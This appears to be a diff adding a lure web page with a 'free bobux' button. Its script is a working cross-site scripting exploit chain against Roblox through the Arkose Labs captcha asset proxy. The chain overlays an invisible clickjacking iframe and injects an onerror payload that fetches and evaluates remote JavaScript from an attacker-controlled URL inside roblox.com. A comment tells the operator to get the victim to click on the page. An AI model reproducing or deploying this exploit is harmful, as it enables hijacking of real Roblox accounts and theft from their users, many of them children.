@@ -1,0 +1,94 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+  </head>
+  <!-- You can change the site content however you want, important is that the victim interacts with the site, for example clicking on a website -->
+  <body>
+    <button onclick="bobux()">free bobux</button>
+  </body>
+</html>
+
+<script>
+    //script from https://twitter.com/h0nde
+    function bobux(){
+        var fcXssFrame
+        var fcXssWindow
+        
+        // this is the script that will get executed in the context of roblox.com
+        // make sure necessary CORS headers are present
+        var robloxContextPayloadUrl = "https://yourdomain.com/payload/payload.js"
+        
+        function getFcXssUrl() {
+            var payload = "window.onmessage=e=>eval(e.data.f)(e.data.args)"
+            payload = "\"><script>" + encodeURIComponent(payload) + "<\/script><!--"
+            return `https://roblox-api.arkoselabs.com/fc/logic/misc/assetProxy.php?replacePublicKey=189B8C9D-51A2-7631-E898-60FD2F7F5212&lang=en${payload}&asset=/fc/js/4c706ee3318caa6f8fde4c297bc97d8a/standard/bootstrap/fc_nojs_bootstrap.html`
+        }
+        
+        function adjustFrame() {
+            fcXssFrame.style=`opacity:0;z-index:999999;position:absolute;left:0;top:0;x:0;y:0;width:100%;height:100%`
+        }
+        
+        function initFcXss() {
+            var f = document.createElement("iframe")
+            fcXssFrame = f
+            f.style="display:none;"
+            f.src = getFcXssUrl()
+            document.body.appendChild(f)
+            fcXssWindow = f.contentWindow
+            setTimeout(()=>{
+                sendFcXss(args=>{
+                    top.postMessage({type:'init'}, "*"); 
+                })
+            }, 200)
+            window.onmessage = e => {
+                fcXssCallback(e.data.type, e.data.args)
+            }
+        }
+        
+        function sendFcXss(f, args) {
+            fcXssWindow.postMessage({f: "(" + f.toString() + ")", args: args}, "https://roblox-api.arkoselabs.com")
+        }
+        
+        function fcXssCallback(type, args) {
+            switch (type) {
+                case "init":
+                    adjustFrame()
+                    sendFcXss(args=>{
+                        document.documentElement.style.cursor = '';
+                        document.onclick=e=>{
+                            var w = window.open("https://www.roblox.com/captcha/app/login?credentialsType=username&credentialsValue="+Math.random(1000,9999))
+                            top.postMessage({type:'window_opened'}, "*")
+                            var i = setInterval(()=>{
+                                try {
+                                    if (w.frames[0]) {
+                                        clearInterval(i)
+                                        var mainPayload = "window.onbeforeunload = function(){return false};history.pushState('Roblox', 'Roblox', 'https://www.roblox.com');$.get('"+args.robloxContextPayloadUrl+"',eval)"
+                                        setTimeout(()=>{
+                                            w.postMessage(JSON.stringify({msg: "replace_fc", data: `&fb_type="></iframe><img src=x onerror="${mainPayload}"><!--&` }), "https://www.roblox.com")
+                                            w.postMessage(JSON.stringify({msg: "replace_fc", data: `&fb_type="></iframe><img src=x onerror="${mainPayload}"><!--&` }), "https://web.roblox.com")
+                                            top.postMessage({type:'done'}, "*")
+                                        }, 100)
+                                    }
+                                } catch { }
+                            }, 100) 
+                        }
+                    }, {robloxContextPayloadUrl:robloxContextPayloadUrl})
+                    break;
+                    
+                    
+                case "done":
+                    document.cookie="omit=1"
+                    location.href="?force=1&key=29976"
+                    break
+            }
+        }
+        
+        window.onresize=adjustFrame
+        initFcXss()
+    }
+    </script>
